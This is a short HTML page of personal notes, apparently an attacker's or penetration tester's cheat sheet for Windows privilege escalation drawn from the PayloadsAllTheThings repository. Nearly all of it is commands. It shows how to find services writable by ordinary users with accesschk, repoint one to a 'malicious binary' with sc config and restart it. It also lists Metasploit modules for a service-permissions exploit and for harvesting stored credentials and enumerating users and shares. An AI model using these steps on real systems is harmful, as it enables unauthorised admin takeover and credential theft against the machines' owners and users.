<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>WindowsPrivilegeEscalation</title>
</head><body><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>&nbsp; <br/>
<br/>
#Weak Service Permission<br/>
<br/>
Download the accesschk.exe Tool from below URL.<br/>
<a href="https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe"><i>https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</i></a>&nbsp; <br/>
<br/>
accesschk.exe /accepteula -uwcqv "<span style="font-family: inherit">authenticated users</span>"<br/>
<br/>
<i>SERVICES_ALL_ACCESS means user has full control on both of these services and can modify the properties of these services.</i>&nbsp; <br/>
<br/>
sc qc weakService <br/>
Letâ€™s find out the status of these services and if the services is running with high level privileges and what binary path name it has<br/>
<br/>
sc config weakService binpath="infected file"<br/>
Let's modify the service and point its binary to our malicious binary &nbsp; <br/>
<br/>
sc stop weakService<br/>
sc start weakService<br/>
<br/>
<br/>
#Metasploit<br/>
use exploit/windows/local/service_permissions<br/>
post/windows/gather/credentials/gpp<br/>
run post/windows/gather/credential_collector <br/>
run post/multi/recon/local_exploit_suggester<br/>
run post/windows/gather/enum_shares<br/>
run post/windows/gather/enum_snmp<br/>
run post/windows/gather/enum_applications<br/>
run post/windows/gather/enum_logged_on_users<br/>
run post/windows/gather/checkvm</body></html>